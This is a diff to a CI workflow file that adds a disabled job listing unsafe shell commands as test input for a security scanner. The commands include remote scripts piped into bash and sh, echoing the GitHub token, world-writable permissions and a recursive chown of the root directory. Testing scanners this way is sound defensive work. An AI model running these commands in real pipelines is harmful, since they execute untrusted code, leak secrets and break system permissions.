@@ -21,3 +21,18 @@ jobs:
           echo "SHA: $GITHUB_SHA"
           uname -a
           pwd
+
+  insecure-command-scan-test:
+    runs-on: self-hosted
+    if: ${{ false }}
+
+    steps:
+      - name: Unsafe command examples for scanner test
+        run: |
+          curl -fsSL https://example.com/install.sh | bash
+          wget -qO- https://example.com/install.sh | sh
+          chmod -R 777 .
+          printenv
+          echo "$GITHUB_TOKEN"
+          sudo chown -R runner:runner /
+          sudo rm -rf /tmp/scanner-test-directory
